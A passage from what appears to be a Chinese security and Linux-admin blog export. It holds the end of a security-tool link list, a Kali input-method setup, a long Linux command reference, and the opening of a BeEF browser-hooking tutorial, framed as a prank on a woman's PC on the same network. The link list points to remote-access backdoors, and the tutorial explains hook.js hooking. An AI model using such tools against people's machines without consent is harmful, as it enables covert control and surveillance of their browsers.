href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p><p>甲方安全工程师生存指南 web索引及日志搜索工具：</p><p><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：</p><p><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger</p><p><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：</p><p><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:</p><p><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:</p><p><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:</p><p><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：</p><p><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a></p><p>linux下恶意代码检测包：</p><p><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：</p><p><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：</p><p><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：</p><p><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：</p><p><a href="https://github.com/google/grr">https://github.com/google/grr</a></p><p>综合主机监控检测平台：</p><p><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：</p><p><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><p><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p><p>蜜罐： SSH蜜罐：</p><p><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：</p><p><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：</p><p><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：</p><p><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：</p><p><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：</p><p><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：</p><p><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p><p>远控： 用gmail充当C&amp;C服务器的后门</p><p><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：</p><p><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：</p><ul><li><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali安装谷歌拼音输入法</title>
    <link href="/2019/07/27/kali%E5%AE%89%E8%A3%85%E8%B0%B7%E6%AD%8C%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/index/"/>
    <url>/2019/07/27/kali%E5%AE%89%E8%A3%85%E8%B0%B7%E6%AD%8C%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>恩。。。之前写过简单版本的，今天写个全的。</p><p>其实是因为我重装系统忘记备份了</p><p><img src="images/u15671341472904572456fm26gp0.jpg"></p><p>下面开始：</p><p>先更新apt-get update &amp;&amp; apt-get upgrade         //同步源的索引，升级软件包</p><p>使用命令 <strong>apt-get install fcitx</strong> 安装输入法框架</p><p><strong>apt-get install fcitx-googlepinyin</strong>  安装谷歌输入法</p><p>reboot重启</p><p>点击菜单点击小企鹅输入法（带config的那个）</p><p>将谷歌输入法置于第一输入</p><p>下面就ok了，愉快的用谷歌拼音吧</p><p><img src="images/timg.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 运维常用命令</title>
    <link href="/2019/07/25/linux-%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index/"/>
    <url>/2019/07/25/linux-%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index/</url>
    
    <content type="html"><![CDATA[<p>1、ls [选项] [目录名 | 列出相关目录下的所有目录和文件 -a 列出包括.a开头的隐藏文件的所有文件 -A 通-a，但不列出”.”和”..” -l 列出文件的详细信息 -c 根据ctime排序显示 -t 根据文件修改时间排序 —color[=WHEN] 用色彩辨别文件类型 WHEN 可以是’never’、’always’或’auto’其中之一 白色：表示普通文件 蓝色：表示目录 绿色：表示可执行文件 红色：表示压缩文件 浅蓝色：链接文件 红色闪烁：表示链接的文件有问题 黄色：表示设备文件 灰色：表示其它文件</p><p>2、mv [选项] 源文件或目录 目录或多个源文件 | 移动或重命名文件</p><p>-b 覆盖前做备份 -f 如存在不询问而强制覆盖 -i 如存在则询问是否覆盖 -u 较新才覆盖 -t 将多个源文件移动到统一目录下，目录参数在前，文件参数在后 eg: mv a /tmp/ 将文件a移动到 /tmp目录下 mv a b 将a命名为b mv /home/zenghao test1.txt test2.txt test</p><p>3、cp [选项] 源文件或目录 目录或多个源文件 | 将源文件复制至目标文件，或将多个源文件复制至目标目录。 -r -R 递归复制该目录及其子目录内容 -p 连同档案属性一起复制过去 -f 不询问而强制复制 -s 生成快捷方式 -a 将档案的所有特性都一起复制</p><p>4、scp [参数] [原路径] [目标路径] | 在Linux服务器之间复制文件和目录 -v 详细显示输出的具体情况 -r 递归复制整个目录 (1) 复制文件： 命令格式： scp local_file remote_username@remote_ip:remote_folder 或者 scp local_file remote_username@remote_ip:remote_file 或者 scp local_file remote_ip:remote_folder 或者 scp local_file remote_ip:remote_file 第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名 第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 (2) 复制目录： 命令格式： scp -r local_folder remote_username@remote_ip:remote_folder 或者 scp -r local_folder remote_ip:remote_folder 第1个指定了用户名，命令执行后需要输入用户密码； 第2个没有指定用户名，命令执行后需要输入用户名和密码； eg: 从 本地 复制到 远程 scp /home/daisy/full.tar.gz <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x37;&#50;&#x2e;&#49;&#57;&#x2e;&#x32;&#46;&#55;&#x35;">&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x37;&#50;&#x2e;&#49;&#57;&#x2e;&#x32;&#46;&#55;&#x35;</a>:/home/root 从 远程 复制到 本地 scp root@/172.19.2.75:/home/root/full.tar.gz /home/daisy/full.tar.gz</p><p>5、rm [选项] 文件 | 删除文件 -r 删除文件夹 -f 删除不提示 -i 删除提示 -v 详细显示进行步骤</p><p>6、touch [选项] 文件 | 创建空文件或更新文件时间 -a 只修改存取时间 -m 值修改变动时间 -r eg:touch -r a b ,使b的时间和a相同 -t 指定特定的时间 eg:touch -t 201211142234.50 log.log -t time [[CC]YY]MMDDhhmm[.SS],C:年前两位</p><p>7、pwd 查看当前所在路径</p><p>8、cd 改变当前目录</p><ul><li>：返回上层目录 .. :返回上层目录</li></ul><p>回车 ：返回主目录 / :根目录</p><p>9、mkdir [选项] 目录… | 创建新目录 -p 递归创建目录，若父目录不存在则依次创建 -m 自定义创建目录的权限 eg:mkdir -m 777 hehe -v 显示创建目录的详细信息</p><p>10、rmdir 删除空目录 -v 显示执行过程 -p 若自父母删除后父目录为空则一并删除</p><p>11、rm [选项] 文件… | 一个或多个文件或目录 -f 忽略不存在的文件，不给出提示 -i 交互式删除 -r 将列出的目录及其子目录递归删除 -v 列出详细信息</p><p>12、echo：显示内容 -n 输出后不换行 -e 遇到转义字符特殊处理 eg:</p><p>   echo “he\nhe”   显示he\nhe<br>   ehco -e “he\nhe”    显示he(换行了)he</p><p>13、cat [选项] [文件]..| 一次显示整个文件或从键盘创建一个文件或将几个文件合并成一个文件 -n 编号文件内容再输出 -E 在结束行提示$</p><p>14、tac | 反向显示</p><p>15、more | 按页查看文章内容，从前向后读取文件，因此在启动时就加载整个文件 +n 从第n行开始显示 -n 每次查看n行数据 +/String 搜寻String字符串位置，从其前两行开始查看 -c 清屏再显示 -p 换页时清屏</p><p>16、less | 可前后移动地逐屏查看文章内容，在查看前不会加载整个文件 -m 显示类似于more命令的百分比 -N 显示行号 / 字符串：向下搜索“字符串”的功能 ? 字符串：向上搜索“字符串”的功能 n 重复前一个搜索（与 / 或 ? 有关） N 反向重复前一个搜索（与 / 或 ? 有关） b 向后翻一页 d 向后翻半页</p><p>17、nl [选项]… [文件]… | 将输出内容自动加上行号 -b -b a 不论是否有空行，都列出行号（类似 cat -n) -b t 空行则不列行号（默认） -n 有ln rn rz三个参数，分别为再最左方显示，最右方显示不加0，最右方显示加0</p><p>18、head [参数]… [文件]… | 显示档案开头，默认开头10行 -v 显示文件名 -c number 显示前number个字符,若number为负数,则显示除最后number个字符的所有内容 -number/n (+)number 显示前number行内容， -n number 若number为负数，则显示除最后number行数据的所有内容</p><p>19、tail [必要参数] [选择参数] [文件] | 显示文件结尾内容 -v 显示详细的处理信息 -q 不显示处理信息 -num/-n (-)num 显示最后num行内容 -n +num 从第num行开始显示后面的数据 -c 显示最后c个字符 -f 循环读取</p><p>20、vi 编辑文件 :w filename 将文章以指定的文件名保存起来 :wq 保存并退出 :q! 不保存而强制退出 命令行模式功能键 1）插入模式 按「i」切换进入插入模式「insert mode」，按”i”进入插入模式后是从光标当前位置开始输入文件； 按「a」进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字； 按「o」进入插入模式后，是插入新的一行，从行首开始输入文字。</p><p>2）从插入模式切换为命令行模式 按「ESC」键。 3）移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 按「ctrl」+「b」：屏幕往”后”移动一页。 按「ctrl」+「f」：屏幕往”前”移动一页。 按「ctrl」+「u」：屏幕往”后”移动半页。 按「ctrl」+「d」：屏幕往”前”移动半页。 按数字「0」：移到文章的开头。 按「G」：移动到文章的最后。 按「$」：移动到光标所在行的”行尾”。 按「^」：移动到光标所在行的”行首” 按「w」：光标跳到下个字的开头 按「e」：光标跳到下个字的字尾 按「b」：光标回到上个字的开头 按「#l」：光标移到该行的第#个位置，如：5l,56l。</p><p>4）删除文字 「x」：每按一次，删除光标所在位置的”后面”一个字符。 「#x」：例如，「6x」表示删除光标所在位置的”后面”6个字符。 「X」：大写的X，每按一次，删除光标所在位置的”前面”一个字符。 「#X」：例如，「20X」表示删除光标所在位置的”前面”20个字符。 「dd」：删除光标所在行。 「#dd」：从光标所在行开始删除#行</p><p>5）复制 「yw」：将光标所在之处到字尾的字符复制到缓冲区中。 「#yw」：复制#个字到缓冲区 「yy」：复制光标所在行到缓冲区。 「#yy」：例如，「6yy」表示拷贝从光标所在的该行”往下数”6行文字。 「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与”y”有关的复制命令都必须与”p”配合才能完成复制与粘贴功能。</p><p>6）替换 「r」：替换光标所在处的字符。 「R」：替换光标所到之处的字符，直到按下「ESC」键为止。</p><p>7）回复上一次操作 「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作。按多次”u”可以执行多次回复。</p><p>8）更改 「cw」：更改光标所在处的字到字尾处 「c#w」：例如，「c3w」表示更改3个字</p><p>9）跳至指定的行 「ctrl」+「g」列出光标所在行的行号。 「#G」：例如，「15G」，表示移动光标至文章的第15行行首。</p><p>21、which 可执行文件名称 | 查看可执行文件的位置，在PATH变量指定的路径中查看系统命令是否存在及其位置</p><p>22、whereis [-bmsu] [BMS 目录名 -f ] 文件名| 定位可执行文件、源代码文件、帮助文件在文件系统中的位置 -b 定位可执行文件。 -m 定位帮助文件。 -s 定位源代码文件。 -u 搜索默认路径下除可执行文件、源代码文件、帮助文件以外的其它文件。 -B 指定搜索可执行文件的路径。 -M 指定搜索帮助文件的路径。 -S 指定搜索源代码文件的路径。</p><p>23、locate | 通过搜寻数据库快速搜寻档案 -r 使用正规运算式做寻找的条件</p><p>24、find find [PATH] [option] [action] | 在文件树种查找文件，并作出相应的处理 选项与参数：</p><ol><li>与时间有关的选项：共有 -atime, -ctime 与 -mtime 和-amin,-cmin与-mmin，以 -mtime 说明 -mtime n ：n 为数字，意义为在 n 天之前的『一天之内』被更动过内容的档案；</li></ol><p>-mtime +n ：列出在 n 天之前(不含 n 天本身)被更动过内容的档案档名； -mtime -n ：列出在 n 天之内(含 n 天本身)被更动过内容的档案档名。 -newer file ：file 为一个存在的档案，列出比 file 还要新的档案档名</p><ol><li>与使用者或组名有关的参数： -uid n ：n 为数字，这个数字是用户的账号 ID，亦即 UID</li></ol><p>-gid n ：n 为数字，这个数字是组名的 ID，亦即 GID -user name ：name 为使用者账号名称！例如 dmtsai -group name：name 为组名，例如 users ； -nouser ：寻找档案的拥有者不存在 /etc/passwd 的人！ -nogroup ：寻找档案的拥有群组不存在于 /etc/group 的档案！</p><ol><li>与档案权限及名称有关的参数： -name filename：搜寻文件名为 filename 的档案（可使用通配符）</li></ol><p>-size [+-]SIZE：搜寻比 SIZE 还要大(+)或小(-)的档案。这个 SIZE 的规格有：</p><p>   c: 代表 byte<br>   k: 代表 1024bytes。所以，要找比 50KB还要大的档案，就是『 -size +50k 』</p><p>-type TYPE ：搜寻档案的类型为 TYPE 的，类型主要有：</p><p>   一般正规档案 (f)<br>   装置档案 (b, c)<br>   目录 (d)<br>   连结档 (l)<br>   socket (s)<br>   FIFO (p)</p><p>-perm mode ：搜寻档案权限『刚好等于』 mode的档案，这个mode为类似chmod的属性值，举例来说，-rwsr-xr-x 的属性为4755！ -perm -mode ：搜寻档案权限『必须要全部囊括 mode 的权限』的档案，举例来说，</p><p>   我们要搜寻-rwxr–r– 亦即 0744 的档案，使用-perm -0744，当一个档案的权限为 -rwsr-xr-x ，亦即 4755 时，也会被列出来，因为 -rwsr-xr-x 的属性已经囊括了 -rwxr–r– 的属性了。</p><p>-perm +mode ：搜寻档案权限『包含任一 mode 的权限』的档案，举例来</p><p>   说，我们搜寻-rwxr-xr-x ，亦即 -perm +755 时，但一个文件属性为 -rw——-也会被列出来，因为他有 -rw…. 的属性存在！</p><ol><li>额外可进行的动作： -exec command ：command 为其他指令，-exec 后面可再接额外的指令来处理搜寻到的结果。</li></ol><p>-print ：将结果打印到屏幕上，这个动作是预设动作！ eg:</p><p>   find / -perm +7000 -exec ls -l {} \; ,额外指令以-exec开头，以\;结尾{}代替前面找到的内容</p><p>| xargs</p><p>   -i  默认的前面输出用{}代替<br>   eg:<br>       find . -name “*.log” | xargs -i mv {} test4</p><p>25、grep ‘正则表达式’ 文件名 | 用正则表达式搜索文本，并把匹配的行打印出来 -c 只输出匹配行的计数。 -I 不区分大小写(只适用于单字符)。 -l 只显示文件名 -v 显示不包含匹配文本的所有行。 -n 显示匹配行数据及其行号</p><p>25、file | 判断文件类型</p><p>26、gzip [-cdtv#] 檔名 | 压缩、解压缩，源文件都不再存在 -d 进行解压缩 -c 将压缩的数据输出到屏幕上 -v :显示原档案/压缩文件案的压缩比等信息 -# ：压缩等级，-1最快，但压缩比最差，=9最慢，但压缩比最好</p><p>27、gunzip | 解压缩</p><p>28、bzip2 | 压缩、解压缩 -d :解压 -z :压缩 -k :保留源文件 -c ：将压缩的过程产生的数据输出到屏幕上！ -v ：可以显示出原档案/压缩文件案的压缩比等信息； -# ：与 gzip 同样的，都是在计算压缩比的参数， -9 最佳， -1 最快！</p><p>29、bzcat 读取数据而无需解压</p><p>30、tar [主选项+辅选项] 文件或者目录 | 多个目录或档案打包、压缩成一个大档案 主选项： -c 建立打包档案，可搭配 -v 来察看过程中被打包的档名(filename) -t 察看打包档案的内容含有哪些档名，重点在察看『档名』就是了； -x 解打包或解压缩的功能，可以搭配 -C (大写) 在特定目录解开 辅选项： -j 透过 bzip2 的支持进行压缩/解压缩：此时档名最好为 *.tar.bz2 -z 透过 gzip 的支持进行压缩/解压缩：此时档名最好为 *.tar.gz -v 在压缩/解压缩的过程中，将正在处理的文件名显示出来！ -f filename -f 后面要立刻接要被处理的档名！ -C 目录 这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。 –exclude FILE：在压缩打包过程中忽略某文件 eg: tar –exclude /home/zenghao -zcvf myfile.tar.gz /home/* /etc -p 保留备份数据的原本权限与属性，常用于备份(-c)重要的配置文件 -P(大写） 保留绝对路径，亦即允许备份数据中含有根目录存在之意； eg: 压 缩：tar -jcvf filename.tar.bz2 要被压缩的档案或目录名称 查 询：tar -jtvf filename.tar.bz2 解压缩：tar -jxvf filename.tar.bz2 -C 欲解压缩的目录</p><p>31、exit 退出当前shell</p><p>32、logout 退出登录shell</p><p>33、shutdown -h now</p><p>34、users 显示当前登录系统地用户</p><p>35、who 登录在本机的用户与来源 -H或–heading 　显示各栏位的标题信息列。</p><p>36、w 登录在本机的用户及其运行的程序 -s 　使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。 -h 　不显示各栏位的标题信息列。</p><p>37、write 给当前联机的用户发消息</p><p>38、wall 给所有登录再本机的用户发消息</p><p>39、last 查看用户的登陆日志</p><p>40、lastlog 查看每个用户最后的登陆时间</p><p>41、finger [选项] [使用者] [用户@主机] | 查看用户信息 -s 显示用户的注册名、实际姓名、终端名称、写状态、停滞时间、登录时间等信息 -l 除了用-s选项显示的信息外，还显示用户主目录、登录shell、邮件状态等信息，以及用户主目录下的.plan、.project和.forward文件的内容。 -p 除了不显示.plan文件和.project文件以外，与-l选项相同</p><p>42、hostname 查看主机名</p><p>43、alias ii = “ls -l” | 添加别名</p><p>44、unalias ii | 清除别名</p><p>45、useradd [-u UID] [-g 初始群组] [-G 次要群组] [-c 说明栏] [-d 家目录绝对路径] [-s shell] 使用者账号名 | 新增用户 -M 不建立用户家目录！(系统账号默认值) -m 建立用户家目录！(一般账号默认值) -r 建立一个系统的账号，这个账号的 UID 会有限制 -e 账号失效日期，格式为『YYYY-MM-DD』 -D 查看useradd的各项默认值</p><p>46、passwd | 修改密码 -l 使密码失效 -u 与-l相对，用户解锁 -S 列出登陆用户passwd文件内的相关参数 -n 后面接天数，shadow 的第 4 字段，多久不可修改密码天数 -x 后面接天数，shadow 的第 5 字段，多久内必须要更动密码 -w 后面接天数，shadow 的第 6 字段，密码过期前的警告天数 -i 后面接『日期』，shadow 的第 7 字段，密码失效日期 使用管道刘设置密码：echo “zeng” | passwd –stdin zenghao</p><p>47、userdel 删除用户 -r 用户文件一并删除</p><p>48、chage [-ldEImMW] 账号名 | 修改用户密码的相关属性 -l 列出该账号的详细密码参数； -d 后面接日期，修改 shadow 第三字段(最近一次更改密码的日期)，格式YYYY-MM-DD -E 后面接日期，修改 shadow 第八字段(账号失效日)，格式 YYYY-MM-DD -I 后面接天数，修改 shadow 第七字段(密码失效日期) -m 后面接天数，修改 shadow 第四字段(密码最短保留天数) -M 后面接天数，修改 shadow 第五字段(密码多久需要进行变更) -W 后面接天数，修改 shadow 第六字段(密码过期前警告日期)</p><p>49、usermod [-cdegGlsuLU] username | 修改用户的相关属性 -c 后面接账号的说明，即 /etc/passwd 第五栏的说明栏，可以加入一些账号的说明。 -d 后面接账号的家目录，即修改 /etc/passwd 的第六栏； -e 后面接日期，格式是 YYYY-MM-DD 也就是在 /etc/shadow 内的第八个字段数据啦！ -f 后面接天数为 shadow 的第七字段。 -g 后面接初始群组，修改 /etc/passwd 的第四个字段，亦即是GID的字段！ -G 后面接次要群组，修改这个使用者能够支持的群组 -l 后面接账号名称。亦即是修改账号名称， /etc/passwd 的第一栏！ -s 后面接 Shell 的实际档案，例如 /bin/bash 或 /bin/csh 等等。 -u 后面接 UID 数字啦！即 /etc/passwd 第三栏的资料； -L 冻结密码 -U 解冻密码</p><p>50、id [username] | 查看用户相关的id信息，还可以用来判断用户是否存在</p><p>51、groups 查看登陆用户支持的群组， 第一个输出的群组为有效群组</p><p>52、newgrp 切换有效群组</p><p>53、groupadd [-g gid] 组名 | 添加组 -g 设定添加组的特定组id</p><p>54、groupmod [-g gid] [-n group_name] 群组名 | 修改组信息 -g 修改既有的 GID 数字 -n 修改既有的组名</p><p>55、groupdel [groupname] | 删除群组</p><p>56、gpasswd | 群组管理员功能 root管理员动作： -gpasswd groupname 设定密码 -gpasswd [-A user1,…] [-M user3,…] groupname</p><p>   -A  将 groupname 的主控权交由后面的使用者管理(该群组的管理员)<br>   -M  将某些账号加入这个群组当中</p><p>-gpasswd [-r] groupname</p><p>   -r  将 groupname 的密码移除</p><p>群组管理员动作：</p><ul><li>gpasswd [-ad] user groupname  -a  将某位使用者加入到 groupname 这个群组当中<br>  -d  将某位使用者移除出 groupname 这个群组当中</li></ul><p>57、chfn修改个人信息</p><p>58、mount [-t vfstype] [-o options] device dir -ro 采用只读方式挂接设备 -rw 采用读写方式挂接设备 eg:mount /home/mydisk.iso /tmp/mnt 通过mnt访问mydisk内的内容</p><p>59、umount 取消挂载</p><p>60、cut -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c ：以字符为单位进行分割。 -d ：自定义分隔符，默认为制表符。 -f ：与-d一起使用，指定显示哪个区域。</p><p>61、sort -n 依照数值的大小排序。 -o&lt;输出文件&gt; 将排序后的结果存入指定的文件。 -r 以相反的顺序来排序。 -t&lt;分隔字符&gt; 指定排序时所用的栏位分隔字符。 -k 选择以哪个区间进行排序。</p><p>62、wc 统计指定文件中的字节数、字数、行数, 并将统计结果显示输出 -l filename 报告行数 -c filename 报告字节数 -m filename 报告字符数 -w filename 报告单词数</p><p>63、uniq 去除文件中相邻的重复行 -c或——count：在每列旁边显示该行重复出现的次数； -d或–repeated：仅显示重复出现的行列； -f&lt;栏位&gt;或–skip-fields=&lt;栏位&gt;：忽略比较指定的栏位； -s&lt;字符位置&gt;或–skip-chars=&lt;字符位置&gt;：忽略比较指定的字符； -u或——unique：仅显示出一次的行列； -w&lt;字符位置&gt;或–check-chars=&lt;字符位置&gt;：指定要比较的字符。</p><p>64、set 显示环境变量和普通变量</p><p>65、env 显示环境变量</p><p>66、export 把普通变量变成环境变量</p><p>67、unset 删除一个环境变量 aaa(){} 定义函数</p><p>68、read -p 接提示字符 -t 接等待的秒数</p><p>69、declare、typeset -i 声明为整数 -a 声明为数组 -f 声明为函数 -r 声明为只读</p><p>70、ulimit 限制使用者的某些系统资源 -f 此 shell 可以建立的最大档案容量 (一般可能设定为 2GB)单位为 Kbytes eg: ulimit -f 1024 限制使用者仅能建立 1MBytes 以下的容量的档案</p><p>71、df [选项] [文件] | 显示指定磁盘文件的可用空间,如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示 -a 显示全部文件系统 -h 文件大小友好显示 -l 只显示本地文件系统 -i 显示inode信息 -T 显示文件系统类型</p><p>72、du [选项] [文件] | 显示每个文件和目录的磁盘使用空间 -h 方便阅读的方式 -s 只显示总和的大小</p><p>73、ln [参数] [源文件或目录] [目标文件或目录] | 某一个文件在另外一个位置建立一个同步的链接 -s 建立软连接 -v 显示详细的处理过程</p><p>74、diff [参数] [文件1或目录1] [文件2或目录2] | 比较单个文件或者目录内容 -b 　不检查空格字符的不同。 -B 　不检查空白行。 -i 不检查大小写 -q 仅显示差异而不显示详细信息 eg: diff a b &gt; parch.log 比较两个文件的不同并产生补丁</p><p>75、date [参数]… [+格式] | 显示或设定系统的日期与时间 %H 小时(以00-23来表示)。 %M 分钟(以00-59来表示)。 %P AM或PM。 %D 日期(含年月日) %U 该年中的周数。 date -s “2015-10-17 01:01:01″ //时间设定 date +%Y%m%d //显示前天年月日 date +%Y%m%d –date=”+1 day/month/year” //显示前一天/月/年的日期 date +%Y%m%d –date=”-1 day/month/year” //显示后一天/月/年的日期 date -d ‘2 weeks’ 2周后的日期</p><p>76、cal [参数] 月份] [年份] | 查看日历 -1 显示当月的月历 -3 显示前、当、后一个月的日历 -m 显示星期一为一个星期的第一天 -s （默认）星期天为第一天 -j 显示当月是一年中的第几天的日历 -y 显示当前年份的日历</p><p>77、ps | 列出当前进程的快照 a 显示所有的进程 -a 显示同一终端下的所有程序 e 显示环境变量 f 显示进程间的关系 -H 显示树状结构 r 显示当前终端的程序 T 显示当前终端的所有程序 -au 显示更详细的信息 -aux 显示所有包含其他使用者的行程 -u 指定用户的所有进程</p><p>78、top [参数] | 显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等</p><p>79、kill [参数] [进程号] | 杀死进程</p><p>80、free [参数] | 显示linux系统中空闲的、已用的物理内存及swap内存,及被内核使用的buffer</p><p>81、vmstat | 对操作系统的虚拟内存、进程、CPU活动进行监控</p><p>82、iostat [参数] [时间t] [次数n](每隔t时间刷新一次，最多刷新n次）| 对系统的磁盘操作活动进行监视,汇报磁盘活动统计情况，同时也会汇报出CPU使用情况 -p[磁盘] 显示磁盘和分区的情况</p><p>83、watch [参数] [命令] |重复执行某一命令以观察变化 -n 时隔多少秒刷新 -d 高亮显示动态变化</p><p>84、at [参数] [时间] | 在一个指定的时间执行一个指定任务，只能执行一次 HH:MM[am|pm] + number [minutes|hours|days|weeks] 强制在某年某月某日的某时刻进行该项任务 atq 查看系统未执行的任务 atrm n 删除编号为n的任务 at -c n 显示编号为n的任务的内容</p><p>85、crontab | 定时任务调度 file 载入crontab -e 编辑某个用户的crontab文件内容 -l 显示某个用户的crontab文件内容 -r 删除某个用户的crontab文件</p><p>86、ifconfig [网络设备] [参数] | 查看和配置网络设备</p><p>87、route | 显示和操作IP路由表</p><p>88、ping [参数] [主机名或IP地址] | 测试与目标主机的连通性 -q 只显示最后的结果</p><p>89、netstat | 显示与IP、TCP、UDP和ICMP协议相关的统计数据</p><p>90、telnet [参数] [主机] | 用于远程登录，采用明文传送报文，安全性不好</p><p>91、rcp [参数] [源文件] [目标文件] | 远程文件拷贝 -r 递归复制 -p 保留源文件的属性 usage: rcp –r remote_hostname:remote_dir local_dir</p><p>92、wget [参数] [URL地址] | 直接从网络上下载文件 -o FILE 把记录写到FILE文件中 eg : wget -O a.txt URL wget –limit-rate=300k URL 限速下载</p><p>93、awk -F 分隔符 以分隔符分隔内容 {} 要执行的脚本内容 eg:cat /etc/passwd |awk -F ‘:’ ‘{print 1”\t”7}’</p><p>94、sed 对数据行进行替换、删除、新增、选取等操作 a 新增，在新的下一行出现 c 取代，取代 n1,n2 之间的行 eg: sed ‘1,2c Hi’ ab d 删除 i 插入，在新的上一行出现</p><p>95、paste 合并文件，需确保合并的两文件行数相同 -d 指定不同于空格或tab键的域分隔符 -s 按行合并，单独一个文件为一行</p><p>96、su [参数] user | 切换登陆 -l 切换时连同环境变量、工作目录一起改变 -c command 执行command变回原来的使用者</p><p>97、sudo | 以特定用户的权限执行特定命令 -l 列出当前用户可执行的命令 -u username#uid 以指定用户执行命令</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网漫步之如何调戏妹纸</title>
    <link href="/2019/07/24/%E5%86%85%E7%BD%91%E6%BC%AB%E6%AD%A5%E4%B9%8B%E5%A6%82%E4%BD%95%E8%B0%83%E6%88%8F%E5%A6%B9%E7%BA%B8/index/"/>
    <url>/2019/07/24/%E5%86%85%E7%BD%91%E6%BC%AB%E6%AD%A5%E4%B9%8B%E5%A6%82%E4%BD%95%E8%B0%83%E6%88%8F%E5%A6%B9%E7%BA%B8/index/</url>
    
    <content type="html"><![CDATA[<p>今天在一个大佬的博客发现了一个挺有意思的小东西，下载开始搬砖：</p><h3 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a>环境说明：</h3><ul><li>kali linux(192.168.0.114) 黑阔滴设备</li><li>win7 (192.168.0.113) 妹纸的pc</li></ul><h3 id="认识beef"><a href="#认识beef" class="headerlink" title="认识beef"></a>认识beef</h3><p><code>BEEF</code> (The Browser Exploitation Framework)：一款浏览器攻击框架，用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。</p><p><code>BeEF</code>主要是往网页中插入一段名为<code>hook.js</code>的JS脚本代码，如果浏览器访问了有<code>hook.js</code>(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。 <img src="https://niu.bbskali.cn/42cbb8cd999212d14dd67e44c706dd59" alt="请输入图片描述" title="请输入图片描述"></p><h3 id="启动BEEF"><a href="#启动BEEF" class="headerlink" title="启动BEEF"></a>启动BEEF</h3><p>方法一：点击栏目中的图标即可启动。 